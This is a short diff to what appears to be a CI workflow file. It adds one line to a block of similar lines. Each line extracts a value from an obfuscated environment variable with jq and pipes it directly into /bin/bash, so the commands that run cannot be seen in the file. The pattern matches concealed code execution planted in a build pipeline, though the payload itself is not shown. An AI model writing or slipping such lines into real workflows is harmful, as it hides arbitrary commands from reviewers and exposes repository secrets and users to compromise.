@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$acm1468" | jq -r .dlba4 | /bin/bash
           echo $tqubj0301 | jq -r .ex6 | /bin/bash
           printf '%s' "$bc4" | jq -r .ljsp8132 | /bin/bash
+          echo $kjpnr6 | jq -r .oja028 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
